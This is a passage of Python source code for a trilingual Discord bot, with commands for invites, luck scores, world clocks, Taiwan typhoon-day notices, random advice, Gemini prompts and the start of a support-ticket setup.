        "description": "下のボタンをクリックして、ユズボットをサーバーに招待しましょう！",
        "footer": "ユズボットをご検討いただきありがとうございます！",
        "button_label": "タイガーボットを招待"
    },
    "en": {
        "title": "Invite Yuzu Bot",
        "description": "Click the button below to invite Yuzu Bot to your server!",
        "footer": "Thank you for considering Yuzu Bot for your server!",
        "button_label": "Invite Yuzu Bot"
    }
}

@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def invitebot(ctx):
    try:
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        invite_text = INVITEBOT_TEXTS.get(language, INVITEBOT_TEXTS["en"])

        invite_embed = discord.Embed(
            title=invite_text["title"],
            description=invite_text["description"],
            color=discord.Color.purple()
        )
        invite_embed.set_footer(text=invite_text["footer"])

        invite_button = Button(
            label=invite_text["button_label"],
            url="https://discord.com/oauth2/authorize?client_id=1303629862011011082&permissions=8&integration_type=0&scope=bot"
        )
        
        view = View()
        view.add_item(invite_button)

        await ctx.send(embed=invite_embed, view=view)
        await handle_exception(ctx, "invitebot", "Success")
    except Exception as e:
        await handle_exception(ctx, "invitebot", "Failure", error=e)
@invitebot.error
async def invitebot_error(ctx, error):
    await handle_cooldown_error(ctx, error)

# luck
LUCK_TEXTS = {
    "zh": {
        "loading": "測運氣中⋯",
        "result": "你的運氣分數是： {score}\n",
        "very_good": "今天你的運氣非常好 :D",
        "good": "今天運氣還不錯 :)",
        "average": "今天運氣普通 :/",
        "bad": "今天運氣不太好，請小心 :("
    },
    "ja": {
        "loading": "運勢を測定中⋯",
        "result": "あなたの運勢スコアは： {score}\n",
        "very_good": "今日はとても運がいいです :D",
        "good": "今日は運がいいです :)",
        "average": "今日は普通の運です :/",
        "bad": "今日は運が良くないので気を付けてください :("
    },
    "en": {
        "loading": "Calculating luck...",
        "result": "Your luck score is: {score}\n",
        "very_good": "You are very lucky today :D",
        "good": "You are quite lucky today :)",
        "average": "Your luck is average today :/",
        "bad": "Your luck isn't great today, be careful :("
    }
}

@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def luck(ctx):
    try:
        luck_score = random.randint(1, 100)
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        luck_text = LUCK_TEXTS.get(language, LUCK_TEXTS["en"])

        loading_embed = discord.Embed(
            description=luck_text["loading"],
            color=0x28FF28
        )
        loading_message = await ctx.send(embed=loading_embed)

        result_embed = discord.Embed(color=0x28FF28)
        result_embed.description = luck_text["result"].format(score=luck_score)

        if luck_score >= 90:
            result_embed.description += luck_text["very_good"]
        elif luck_score >= 70:
            result_embed.description += luck_text["good"]
        elif luck_score >= 40:
            result_embed.description += luck_text["average"]
        else:
            result_embed.description += luck_text["bad"]

        await loading_message.edit(embed=result_embed)
        
        await handle_exception(ctx, "luck", "Success")
    except Exception as e:
        await handle_exception(ctx, "luck", "Failure", error=e)
@luck.error
async def luck_error(ctx, error):
    await handle_cooldown_error(ctx, error)
        
# ping
@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def ping(ctx):
    try:
        await ctx.send('Pong!')
        await handle_exception(ctx, "ping", "Success")
    except Exception as e:
        await handle_exception(ctx, "ping", "Failure", error=e)
@ping.error
async def ping_error(ctx, error):
    await handle_cooldown_error(ctx, error)
    
# hello
@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def hello(ctx):
    try:
        await ctx.send('Hello!')
        await handle_exception(ctx, "hello", "Success")
    except Exception as e:
        await handle_exception(ctx, "hello", "Failure", error=e)
@hello.error
async def hello_error(ctx, error):
    await handle_cooldown_error(ctx, error)
    
# timezone
TIMEZONE_TEXTS = {
    "zh": {
        "title": "各國當前時間",
        "countries": {
            "台灣": "Asia/Taipei",
            "日本": "Asia/Tokyo",
            "美國": "America/New_York",
            "英國": "Europe/London",
            "德國": "Europe/Berlin",
            "澳洲": "Australia/Sydney",
            "印度": "Asia/Kolkata",
            "巴西": "America/Sao_Paulo",
            "南非": "Africa/Johannesburg"
        }
    },
    "ja": {
        "title": "各国の現在時刻",
        "countries": {
            "台湾": "Asia/Taipei",
            "日本": "Asia/Tokyo",
            "アメリカ": "America/New_York",
            "イギリス": "Europe/London",
            "ドイツ": "Europe/Berlin",
            "オーストラリア": "Australia/Sydney",
            "インド": "Asia/Kolkata",
            "ブラジル": "America/Sao_Paulo",
            "南アフリカ": "Africa/Johannesburg"
        }
    },
    "en": {
        "title": "Current Time in Various Countries",
        "countries": {
            "Taiwan": "Asia/Taipei",
            "Japan": "Asia/Tokyo",
            "United States": "America/New_York",
            "United Kingdom": "Europe/London",
            "Germany": "Europe/Berlin",
            "Australia": "Australia/Sydney",
            "India": "Asia/Kolkata",
            "Brazil": "America/Sao_Paulo",
            "South Africa": "Africa/Johannesburg"
        }
    }
}

@bot.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def timezone(ctx):
    try:
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        timezone_text = TIMEZONE_TEXTS.get(language, TIMEZONE_TEXTS["en"])

        embed = discord.Embed(title=timezone_text["title"], color=0x0080FF)

        for country, tz_name in timezone_text["countries"].items():
            timezone = pytz.timezone(tz_name)
            current_time = datetime.now(timezone).strftime('%Y-%m-%d %H:%M:%S')
            embed.add_field(name=country, value=f"{tz_name}: {current_time}", inline=False)

        await ctx.send(embed=embed)
        await handle_exception(ctx, "timezone", "Success")

    except Exception as e:
        await handle_exception(ctx, "timezone", "Failure", error=e)
@timezone.error
async def timezone_error(ctx, error):
    await handle_cooldown_error(ctx, error)

''' ----- Basic Commands ----- '''
#
#
#
''' ----- Some Features ----- '''

# typhoonday
@bot.command()
@commands.cooldown(1, 10, commands.BucketType.user)
async def typhoonday(ctx):
    embed = discord.Embed(title="Typhoon Day Information", description="Loading...", color=0xFFA500)
    message = await ctx.send(embed=embed)

    url = "https://www.dgpa.gov.tw/typh/daily/nds.html"
    try:
        response = requests.get(url)
        
        if response.status_code == 200:
            response.encoding = 'utf-8'
            soup = BeautifulSoup(response.text, 'html.parser')
            status_data = defaultdict(list)

            rows = soup.select('tr')

            if not rows or len(rows) <= 1:
                embed = discord.Embed(
                    title="Typhoon Day Information",
                    description="目前無停班停課消息", 
                    color=0xFFA500
                )
                await message.edit(embed=embed)
                await handle_exception(ctx, "typhoonday", "Success")
                return

            for row in rows:
                columns = row.find_all('td')
                if len(columns) == 2:
                    city = columns[0].text.strip()
                    status = columns[1].text.strip()
                    status_data[city].append(status)

            if not status_data:
                embed = discord.Embed(
                    title="Typhoon Day Information",
                    description="目前無停班停課消息", 
                    color=0xFFA500
                )
            else:
                embed = discord.Embed(title="Typhoon Day Information", color=0x00FF00)
                for city, statuses in status_data.items():
                    embed.add_field(name=city, value="\n".join(statuses), inline=False)

            await message.edit(embed=embed)
            await handle_exception(ctx, "typhoonday", "Success")

        else:
            embed = discord.Embed(
                title="Typhoon Day Information",
                description=f"無法取得資料，狀態碼: {response.status_code}", 
                color=0xFF0000
            )
            await message.edit(embed=embed)
            await handle_exception(ctx, "typhoonday", "Failure", error=f"Status code: {response.status_code}")

    except Exception as e:
        embed = discord.Embed(
            title="Typhoon Day Information",
            description=f"發生錯誤: {e}", 
            color=0xFF0000
        )
        await message.edit(embed=embed)
        await handle_exception(ctx, "typhoonday", "Failure", error=str(e))
@typhoonday.error
async def typhoonday_error(ctx, error):
    await handle_cooldown_error(ctx, error)
        
# advice
ADVICE_TEXTS = {
    "zh": [
    "相信自己的直覺。", "多考慮所有選擇。", "現在行動是最好的決定。", "再等一下，時機還沒成熟。",
    "詢問你信任的朋友意見。", "休息一下，重新思考你的問題。", "也許現在不是最好的時間。",
    "追隨你的心，勇敢行動。", "不妨試試看，結果可能出乎意料。", "注意周圍的訊號，它們會指引你。",
    "保持冷靜，事情會變得明朗。", "計劃未來，但不要過於擔心。", "放下過去的包袱，輕鬆前行。",
    "不要忽視身邊的小細節。", "學習如何說“不”。", "這是自我成長的機會。", "勇敢表達你的真實感受。",
    "事情往往比你想的要簡單。", "嘗試從另一個角度看問題。", "簡單一點，享受當下。",
    "別害怕失敗，這是學習的過程。", "找到內心的平靜，然後再出發。", "嘗試新事物，也許你會喜歡上它。",
    "保持耐心，事情需要時間。", "專注於可以改變的事情。", "保持好奇，世界充滿驚喜。",
    "試著聽從自己的內心聲音。", "凡事量力而為。", "這是一個重新開始的好機會。",
    "信任你的直覺，尤其在艱難時。", "記得休息，保持充沛的精力。", "人生沒有捷徑，享受旅程吧。",
    "別害怕改變，它是成長的一部分。", "你的潛力比你想的更大。", "放慢腳步，細細體會生活。",
    "尋找生活中的小確幸。", "每一天都是新的開始。", "試著接受你無法改變的事情。",
    "信任你所愛的人，他們在支持你。", "學會原諒，不僅是對別人，也是對自己。", "對未來充滿希望。",
    "每個困難都是成長的契機。", "別讓過去影響你的未來。", "生活中有許多值得感恩的事物。",
    "記得你的夢想，不要輕易放棄。", "給自己一個微笑，鼓勵自己。", "不要總是和自己比較。",
    "生活不必完美，真實就好。", "別忘了追求快樂。", "找到生活中的平衡。", "做個堅強的人。",
    "相信你可以創造奇蹟。", "每個人都有自己的步調，保持自信。", "別讓壓力佔據你的生活。",
    "生活中總有美好的事物在等待你。", "向前走，別回頭。", "給自己設定新的目標。",
    "用心對待每一件小事。", "試著換個環境，找找靈感。", "每個錯誤都是一個學習機會。",
    "尋找自己的熱情所在。", "找到生活中的意義。", "勇敢面對自己的缺點。", "享受每一刻，因為它不會重來。",
    "別讓他人的評價影響你。", "學會欣賞自己。", "保持正向的態度。", "用心感受生活。",
    "隨時為自己加油打氣。", "給自己一個安靜的時刻。", "專注於當下，別過於擔心未來。",
    "每一件小事都值得重視。", "別讓恐懼限制你的生活。", "信任自己的能力。",
    "嘗試新鮮的體驗。", "對人保持善意。", "找到屬於自己的節奏。", "培養自信心。",
    "學會珍惜擁有的事物。", "生活是一場冒險，享受它。", "勇敢追求你的目標。",
    "別忘了初心。", "保持耐心，成功需要時間。", "在困難中尋找希望。",
    "每一天都可以是新的開始。", "記住快樂是內心的選擇。", "尋找人生的意義。",
    "找到你的夢想，然後追求它。", "不要害怕獨處。", "感恩生活中的小確幸。",
    "保持開放的心態。", "接受挑戰，它會讓你更強大。", "做自己，別為他人而改變。",
    "不要害怕改變。", "跟隨自己的內心。", "找到你的熱情所在。",
    "每一個困難都是機會。", "學會管理你的情緒。", "培養正向思維。",
    "做一個溫暖的人。", "保持謙虛。", "找到自己的價值。",
    "培養你的才能。", "關心你的健康。", "生活中充滿美好。",
    "別害怕挑戰。", "保持樂觀。", "享受你的生活。",
    "放鬆心情。", "對未來保持希望。", "成為更好的自己。",
    "信任你的朋友。", "不要過度擔心。", "勇敢嘗試。",
    "找到你的目標。", "感受當下。", "活在當下。",
    "別忘了微笑。", "每一天都是禮物。", "重視你擁有的一切。",
    "尋找快樂。", "放下過去。", "活出自我。",
    "追求你的夢想。", "做你自己。", "對生活充滿熱情。",
    "每一天都很重要。", "找到你的熱愛。", "追隨你的心。",
    "放鬆自己。", "每一天都是機會。", "感謝每一刻。",
    "保持自信。", "每一個選擇都很重要。", "每一天都有意義。",
    "信任你的直覺。", "找到你的熱情。", "保持冷靜。",
    "追求你的夢想。", "接受挑戰。", "勇敢追夢。",
    "每一天都是新的。", "找到你的方向。", "信任自己。",
    "追隨你的熱情。", "珍惜當下。", "保持開放。",
    "每一刻都值得。", "放下過去。", "每一件小事都有意義。",
    "找到你的價值。", "信任你的直覺。", "做一個好人。",
    "保持耐心。", "放鬆心情。", "每一天都是新開始。",
    "相信未來。", "找到你的目標。", "別害怕改變。",
    "感受當下。", "勇敢行動。", "保持冷靜。",
    "每一天都有新機會。", "不要害怕挑戰。", "每一刻都是禮物。",
    "追隨你的心。", "活在當下。", "每一天都有新可能。",
    "保持希望。", "每一天都是新的一天。", "珍惜每一刻。",
    "放下過去。", "對未來充滿信心。", "勇敢面對。",
    "不要輕易放棄。", "生活充滿可能。", "學會感恩。",
    "每一刻都是禮物。", "放慢腳步。", "找到你的熱情。",
    "對未來保持期待。", "別害怕嘗試。", "找到生活的美好。",
    "保持冷靜。", "每一天都是新的可能。", "保持希望。",
    "信任自己的決定。", "每一刻都有價值。", "放下過去。",
    "每一天都是新機會。", "保持正向心態。", "對未來充滿期待。",
    "信任你的直覺。", "每一天都是禮物。", "找到內心的平靜。",
    "對生活充滿熱情。", "每一天都有意義。", "保持冷靜。",
    "每一刻都是新開始。", "每一天都是機會。", "放下過去。",
    "找到生活的美好。", "每一刻都是禮物。", "保持樂觀。",
    "珍惜你所擁有的。", "每一天都是機會。", "信任自己的能力。",
    "放下過去。", "對未來充滿希望。", "每一刻都是禮物。",
    "信任你的直覺。", "找到生活的美好。", "保持冷靜。",
    "對未來充滿期待。", "每一天都是新開始。", "每一刻都是新機會。",
    "保持正面思維。", "信任你的心。", "每一刻都是機會。",
    "對未來充滿希望。", "每一刻都是禮物。", "放下過去。",
    "對未來充滿信心。", "保持正向心態。", "每一刻都是機會。",
    "每一天都是新可能。", "信任自己的能力。", "放下過去。", "信任你的心。"
],
    "ja": [
    "自分の直感を信じてください。", "すべての選択肢を考慮してください。", "今行動することが最善の決断です。", "少し待ってください、タイミングがまだ整っていません。",
    "信頼できる友人に意見を求めてください。", "休憩して、問題を再考してください。", "今は最適な時期ではないかもしれません。",
    "心に従い、勇気を持って行動してください。", "試してみてください、結果は予想外かもしれません。", "周囲のサインに注意を払ってください。それらが道を示してくれるでしょう。",
    "冷静に保ちましょう。物事は明確になります。", "未来を計画してください、ただし心配しすぎないでください。", "過去の重荷を手放し、軽やかに進んでください。",
    "身近な小さなことを見逃さないでください。", "「ノー」と言う方法を学びましょう。", "これは自己成長の機会です。", "自分の本当の気持ちを勇敢に表現してください。",
    "物事はあなたが思っているよりも簡単です。", "別の視点から問題を見てみてください。", "シンプルにして、今を楽しんでください。",
    "失敗を恐れないでください。それは学びのプロセスです。", "心の平和を見つけてから再出発してください。", "新しいことに挑戦してみてください。気に入るかもしれません。",
    "忍耐強くいましょう。物事には時間がかかります。", "変えられることに集中してください。", "好奇心を持ち続けてください。世界は驚きで満ちています。",
    "自分の内なる声に耳を傾けてください。", "無理をしないでください。", "これは新たなスタートの良い機会です。",
    "困難な時には特に、あなたの直感を信じてください。", "休息を忘れずに、エネルギーを保ちましょう。", "人生には近道がありません。旅を楽しんでください。",
    "変化を恐れないでください。それは成長の一部です。", "あなたの可能性は思っている以上に大きいです。", "ペースを落として、人生をじっくり味わってください。",
    "生活の中の小さな幸せを見つけてください。", "毎日は新しい始まりです。", "変えられないことを受け入れてみましょう。",
    "愛する人を信頼してください。彼らはあなたを支えています。", "許すことを学んでください。それは他人だけでなく自分にも必要です。", "未来に希望を持ちましょう。",
    "すべての困難は成長の機会です。", "過去があなたの未来に影響を与えないようにしましょう。", "人生には感謝すべきことがたくさんあります。",
    "あなたの夢を忘れないでください。簡単にはあきらめないでください。", "自分に微笑みを送り、励ましてください。", "自分と他人を常に比較しないでください。",
    "完璧を求めず、真実であることが大切です。", "幸せを追求することを忘れないでください。", "生活のバランスを見つけましょう。", "強い人になりましょう。",
    "あなたは奇跡を起こすことができると信じてください。", "皆それぞれのペースがあります。自信を持ちましょう。", "ストレスに支配されないようにしましょう。",
    "人生には常に美しいものが待っています。", "前を向いて進みましょう。振り返らないでください。", "自分に新しい目標を設定してください。",
    "小さなことにも心を込めて取り組んでください。", "環境を変えてみて、インスピレーションを得ましょう。", "すべてのミスは学びの機会です。",
    "自分の情熱を見つけてください。", "人生の意味を見つけましょう。", "自分の欠点に勇敢に向き合いましょう。", "すべての瞬間を楽しんでください。それは二度と訪れません。",
    "他人の評価に影響されないでください。", "自分を大切にすることを学んでください。", "前向きな態度を保ちましょう。", "心から生活を感じてください。",
    "いつでも自分を応援しましょう。", "静かな時間を自分に与えましょう。", "今に集中して、将来の心配をしすぎないでください。",
    "小さなことでも価値があるものとして見ましょう。", "恐怖があなたの生活を制限しないようにしましょう。", "自分の能力を信じてください。",
    "新鮮な体験を試してみてください。", "他人に対して親切に接しましょう。", "自分のリズムを見つけてください。", "自信を持ちましょう。",
    "自分が持っているものを大切にしてください。", "人生は冒険です。それを楽しみましょう。", "目標を勇敢に追い求めましょう。",
    "初心を忘れないでください。", "忍耐強くいましょう。成功には時間がかかります。", "困難の中に希望を見つけましょう。",
    "毎日は新たな始まりです。", "幸せは心の選択です。", "人生の意味を探してみましょう。",
    "あなたの夢を見つけ、それを追い求めましょう。", "孤独を恐れないでください。", "生活の中の小さな幸せに感謝してください。",
    "オープンな心を持ち続けましょう。", "挑戦を受け入れてください。それはあなたを強くします。", "自分らしくいましょう。他人のために変わらないでください。",
    "変化を恐れないでください。", "自分の心に従ってください。", "情熱を見つけてください。",
    "すべての困難はチャンスです。", "感情を管理する方法を学びましょう。", "ポジティブな思考を養いましょう。",
    "温かい人になりましょう。", "謙虚さを保ちましょう。", "自分の価値を見つけてください。",
    "才能を育ててください。", "健康に気を配りましょう。", "人生は美しいもので満ちています。",
    "挑戦を恐れないでください。", "楽観的でいましょう。", "人生を楽しんでください。",
    "気持ちをリラックスさせましょう。", "未来に希望を持ち続けましょう。", "より良い自分を目指しましょう。",
    "友人を信頼してください。", "心配しすぎないでください。", "勇敢に挑戦しましょう。",
    "目標を見つけてください。", "今を感じてください。", "今この瞬間を生きましょう。",
    "笑顔を忘れないでください。", "毎日は贈り物です。", "持っているすべてのものを大切にしてください。",
    "幸せを探してください。", "過去を手放しましょう。", "自分らしく生きましょう。",
    "夢を追い求めてください。", "自分自身でいてください。", "生活に情熱を持ってください。",
    "毎日が大切です。", "好きなものを見つけてください。", "自分の心に従ってください。",
    "リラックスしてください。", "毎日はチャンスです。", "すべての瞬間に感謝しましょう。",
    "自信を持ってください。", "すべての選択が重要です。", "毎日には意味があります。",
    "直感を信じてください。", "情熱を見つけてください。", "冷静でいてください。",
    "夢を追い求めてください。", "挑戦を受け入れてください。", "勇敢に夢を追いかけてください。",
    "毎日は新しいです。", "自分の方向性を見つけてください。", "自分を信じてください。",
    "情熱に従ってください。", "今を大切にしてください。", "オープンな姿勢を保ってください。",
    "すべての瞬間が価値があります。", "過去を手放してください。", "小さなことも意味があります。",
    "あなたの価値を見つけてください。", "直感を信じてください。", "良い人でいましょう。",
    "忍耐強くいましょう。", "気持ちをリラックスさせましょう。", "毎日が新しい始まりです。",
    "未来を信じましょう。", "目標を見つけてください。", "変化を恐れないでください。",
    "今を感じてください。", "勇敢に行動しましょう。", "冷静でいてください。",
    "毎日は新しい機会をもたらします。", "挑戦を恐れないでください。", "すべての瞬間が贈り物です。",
    "心に従ってください。", "今この瞬間を生きましょう。", "毎日が新しい可能性を秘めています。",
    "希望を持ち続けましょう。", "毎日は新しい日です。", "すべての瞬間を大切にしてください。",
    "過去を手放してください。", "未来に自信を持ちましょう。", "困難に勇敢に立ち向かいましょう。",
    "簡単にはあきらめないでください。", "人生には無限の可能性があります。", "感謝の気持ちを学びましょう。",
    "すべての瞬間が贈り物です。", "ペースを落としてください。", "情熱を見つけてください。",
    "未来に期待を持ちましょう。", "新しいことに挑戦することを恐れないでください。", "人生の美しさを見つけてください。",
    "冷静でいてください。", "毎日は新しい可能性をもたらします。", "希望を持ち続けましょう。",
    "自分の決断を信じてください。", "すべての瞬間には価値があります。", "過去を手放してください。",
    "毎日は新しいチャンスです。", "前向きな姿勢を維持しましょう。", "未来に期待を持ちましょう。",
    "直感を信じてください。", "毎日は贈り物です。", "内なる平和を見つけてください。",
    "情熱をもって生活を楽しんでください。", "毎日には意味があります。", "冷静でいてください。",
    "すべての瞬間が新しい始まりです。", "毎日はチャンスです。", "過去を手放してください。",
    "人生の美しさを見つけてください。", "すべての瞬間が贈り物です。", "楽観的でいましょう。",
    "持っているものを大切にしてください。", "毎日はチャンスです。", "自分の能力を信じてください。",
    "過去を手放してください。", "未来に希望を持ちましょう。", "すべての瞬間が贈り物です。",
    "直感を信じてください。", "人生の美しさを見つけてください。", "冷静でいてください。",
    "未来に期待を持ちましょう。", "毎日は新しい始まりです。", "すべての瞬間が新しい機会です。",
    "前向きな姿勢を保ちましょう。", "自分の心を信じてください。", "すべての瞬間がチャンスです。",
    "未来に希望を持ち続けましょう。", "すべての瞬間が贈り物です。", "過去を手放してください。",
    "未来に自信を持ちましょう。", "前向きな考え方を維持しましょう。", "すべての瞬間がチャンスです。",
    "毎日は新しい可能性を秘めています。", "自分の能力を信じてください。", "過去を手放してください。", "自分の心を信じてください。"
],
    "en": [
    "Trust your intuition.", "Consider all options.", "Act now; it's the best decision.", "Wait a bit; the timing isn't right yet.",
    "Seek advice from friends you trust.", "Take a break and rethink your question.", "Maybe now is not the best time.",
    "Follow your heart and act bravely.", "Give it a try; the outcome might surprise you.", "Pay attention to signs around you; they'll guide you.",
    "Stay calm; things will become clearer.", "Plan for the future, but don't worry too much.", "Let go of past burdens and move forward with ease.",
    "Don't ignore the small details around you.", "Learn how to say 'No'.", "This is a chance for self-growth.", "Express your true feelings bravely.",
    "Things are often simpler than you think.", "Try looking at the problem from another perspective.", "Simplify and enjoy the moment.",
    "Don't fear failure; it's part of learning.", "Find inner peace, then proceed.", "Try something new; you might end up liking it.",
    "Be patient; things take time.", "Focus on what you can change.", "Stay curious; the world is full of surprises.",
    "Listen to your inner voice.", "Know your limits in everything.", "This is a great chance for a fresh start.",
    "Trust your intuition, especially in tough times.", "Remember to rest and stay energized.", "There are no shortcuts in life; enjoy the journey.",
    "Don't fear change; it's part of growth.", "Your potential is greater than you think.", "Slow down and savor life.",
    "Look for little moments of happiness in life.", "Each day is a new beginning.", "Try to accept what you cannot change.",
    "Trust those you love; they support you.", "Learn to forgive, both others and yourself.", "Have hope for the future.",
    "Every challenge is an opportunity to grow.", "Don't let the past affect your future.", "There are many things to be grateful for in life.",
    "Remember your dreams; don't give up easily.", "Give yourself a smile for encouragement.", "Stop comparing yourself to others.",
    "Life doesn't need to be perfect; being real is enough.", "Don't forget to pursue happiness.", "Find balance in life.", "Be a strong person.",
    "Believe you can create miracles.", "Everyone has their own pace; stay confident.", "Don't let stress dominate your life.",
    "There are always beautiful things waiting for you in life.", "Move forward without looking back.", "Set new goals for yourself.",
    "Handle each small thing with care.", "Try changing your environment for inspiration.", "Every mistake is a learning opportunity.",
    "Find your passion in life.", "Discover the meaning of life.", "Face your flaws courageously.", "Enjoy each moment because it won't come again.",
    "Don't let others' opinions affect you.", "Learn to appreciate yourself.", "Maintain a positive attitude.", "Feel life with all your heart.",
    "Always cheer yourself up.", "Give yourself a quiet moment.", "Focus on the present, don't worry too much about the future.",
    "Every little thing is worth valuing.", "Don't let fear limit your life.", "Trust in your abilities.",
    "Try fresh experiences.", "Be kind to others.", "Find your own rhythm.", "Build self-confidence.",
    "Learn to cherish what you have.", "Life is an adventure; enjoy it.", "Pursue your goals bravely.",
    "Never forget your original intentions.", "Be patient; success takes time.", "Find hope amidst challenges.",
    "Every day can be a new beginning.", "Remember, happiness is a choice from within.", "Search for the meaning of life.",
    "Find your dreams and pursue them.", "Don't be afraid of solitude.", "Appreciate the small happiness in life.",
    "Keep an open mind.", "Accept challenges; they make you stronger.", "Be yourself; don't change for others.",
    "Don't be afraid of change.", "Follow your heart.", "Find your passion.",
    "Every hardship is an opportunity.", "Learn to manage your emotions.", "Cultivate positive thinking.",
    "Be a warm-hearted person.", "Stay humble.", "Find your worth.",
    "Develop your talents.", "Take care of your health.", "Life is full of beauty.",
    "Don't be afraid of challenges.", "Stay optimistic.", "Enjoy your life.",
    "Relax your mind.", "Keep hope for the future.", "Become a better version of yourself.",
    "Trust your friends.", "Don't worry too much.", "Take bold steps.",
    "Find your goals.", "Feel the present.", "Live in the moment.",
    "Don't forget to smile.", "Every day is a gift.", "Value everything you have.",
    "Seek happiness.", "Let go of the past.", "Live your true self.",
    "Pursue your dreams.", "Be yourself.", "Fill life with enthusiasm.",
    "Every day is important.", "Find what you love.", "Follow your heart.",
    "Relax yourself.", "Every day is an opportunity.", "Appreciate each moment.",
    "Stay confident.", "Every choice is important.", "Each day has meaning.",
    "Trust your intuition.", "Find your passion.", "Stay calm.",
    "Pursue your dreams.", "Accept challenges.", "Chase your dreams bravely.",
    "Each day is new.", "Find your direction.", "Trust yourself.",
    "Follow your passion.", "Cherish the present.", "Stay open.",
    "Every moment is worthwhile.", "Let go of the past.", "Every small thing has meaning.",
    "Find your value.", "Trust your intuition.", "Be a good person.",
    "Be patient.", "Calm your mind.", "Each day is a fresh start.",
    "Believe in the future.", "Find your goals.", "Don't be afraid of change.",
    "Feel the present.", "Act courageously.", "Stay calm.",
    "Every day brings new opportunities.", "Don't fear challenges.", "Each moment is a gift.",
    "Follow your heart.", "Live in the moment.", "Each day holds new possibilities.",
    "Keep hope alive.", "Every day is a new day.", "Cherish every moment.",
    "Let go of the past.", "Be confident about the future.", "Face challenges courageously.",
    "Don't give up easily.", "Life is full of possibilities.", "Learn to be grateful.",
    "Every moment is a gift.", "Slow down.", "Find your passion.",
    "Look forward to the future.", "Don't fear trying new things.", "Find the beauty in life.",
    "Stay calm.", "Each day brings new possibilities.", "Keep hope alive.",
    "Trust your decisions.", "Every moment has value.", "Let go of the past.",
    "Each day is a new opportunity.", "Maintain a positive mindset.", "Look forward to the future.",
    "Trust your intuition.", "Each day is a gift.", "Find inner peace.",
    "Fill your life with passion.", "Each day has meaning.", "Stay calm.",
    "Each moment is a fresh start.", "Every day is a chance.", "Let go of the past.",
    "Find the beauty in life.", "Each moment is a gift.", "Stay optimistic.",
    "Cherish what you have.", "Every day is a chance.", "Trust your abilities.",
    "Let go of the past.", "Stay hopeful for the future.", "Each moment is a gift.",
    "Trust your intuition.", "Discover the beauty in life.", "Stay calm.",
    "Look forward to the future.", "Each day is a new beginning.", "Each moment brings new opportunities.",
    "Keep a positive mindset.", "Trust your heart.", "Each moment is a chance.",
    "Stay hopeful for the future.", "Each moment is a gift.", "Let go of the past.",
    "Stay confident about the future.", "Maintain a positive outlook.", "Each moment is a chance.",
    "Every day holds new possibilities.", "Trust your abilities.", "Let go of the past.", "Trust your heart."
]
}

@bot.command()
@commands.cooldown(1, 1.5, commands.BucketType.user)
async def advice(ctx):
    try:
        if ctx.guild:
            guild_id = ctx.guild.id
            language = get_language(guild_id)
        else:
            language = "en"

        advice_list = ADVICE_TEXTS.get(language, ADVICE_TEXTS["en"])

        response = random.choice(advice_list)

        embed = discord.Embed(
            description=response,
            color=0x00ffcc
        )

        await ctx.send(embed=embed)
        await handle_exception(ctx, "advice", "Success")
        
    except Exception as e:
        await handle_exception(ctx, "advice", "Failure", error=e)
@advice.error
async def advice_error(ctx, error):
    await handle_cooldown_error(ctx, error)

@bot.command(name="gemini")
async def gemini(ctx, *, prompt: str = None):
    """
    Responds to the $gemini command followed by user input.
    """
    if not prompt:
        await ctx.send("Please provide content after the $gemini command.")
        return

    try:
        # Generate a response using the model
        response = model.generate_content(prompt)

        # Check if the response exceeds Discord's character limit
        if len(response.text) > 2000:
            # Save the response to a .txt file
            file_path = "response.txt"
            with open(file_path, "w", encoding="utf-8") as file:
                file.write(response.text)

            # Send the file as an attachment
            await ctx.send("The response is too long to display, so it has been attached as a file.", 
                           file=discord.File(file_path))
        else:
            # Send the response as a regular message
            await ctx.send(response.text)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")


''' ----- Some Features ----- '''
#
#
#
''' ----- Ticket System ----- '''

ticket_embeds = load_ticket_embeds()
temp_roles = {}

LANGUAGE_SETTINGS = {
    "zh": {
        "setup_button_label": "點擊設定",
        "setup_title": "支援票設定",
        "setup_description": "點擊下方按鈕設定支援票",
        "modal_title": "Support Ticket 設定",
        "title_label": "標題",
        "title_placeholder": "請輸入標題",
        "desc_label": "內容",
        "desc_placeholder": "請輸入內容",
        "button_label": "按鈕標籤",
        "button_placeholder": "請輸入按鈕標籤",
        "color_label": "顏色",
        "color_placeholder": "請輸入顏色 (例如 '#000000' 或 'blue')",
        "close_ticket": "支援票已關閉，訊息記錄已保存為HTML檔案。",
        "end_ticket": "此支援票頻道即將被刪除。",
        "no_permission": "抱歉，您沒有管理員權限來使用此命令。",
    },
    "ja": {
        "setup_button_label": "セットアップ",
        "setup_title": "サポートチケット設定",
        "setup_description": "下のボタンをクリックしてサポートチケットを設定してください。",
        "modal_title": "サポートチケットをセットアップ",
        "title_label": "タイトル",
        "title_placeholder": "タイトルを入力してください",
        "desc_label": "内容",
        "desc_placeholder": "内容を入力してください",
        "button_label": "ボタンラベル",
        "button_placeholder": "ボタンラベルを入力してください",
        "color_label": "色",
        "color_placeholder": "色を入力してください（例：'#000000'または'blue'）",
        "close_ticket": "サポートチケットは閉じられ、メッセージの記録が保存されました。",
        "end_ticket": "このチャンネルは削除されます。",
        "no_permission": "申し訳ありませんが、このコマンドを使用する権限がありません。",
    },
    "en": {
        "setup_button_label": "Click to Setup",
        "setup_title": "Support Ticket Setup",
        "setup_description": "Click the button below to setup Support Ticket",
        "modal_title": "Support Ticket Setup",
        "title_label": "Title",
        "title_placeholder": "Enter title",
        "desc_label": "Description",
        "desc_placeholder": "Enter description",
        "button_label": "Button Label",
        "button_placeholder": "Enter button label",
        "color_label": "Color",
        "color_placeholder": "Enter color (e.g., '#000000' or 'blue')",
        "close_ticket": "Ticket has been closed and transcript saved.",
        "end_ticket": "This channel will now be deleted.",
        "no_permission": "Sorry, you do not have administrator permissions to use this command.",
    }
}

class TicketView(View):
    def __init__(self, language="en"):
        super().__init__(timeout=None)
        settings = LANGUAGE_SETTINGS.get(language, LANGUAGE_SETTINGS["en"])
        self.language = language
        
        if language == "zh":
            button = Button(label="點擊設定", style=discord.ButtonStyle.primary, custom_id="ticket_modal_zh")
        elif language == "ja":
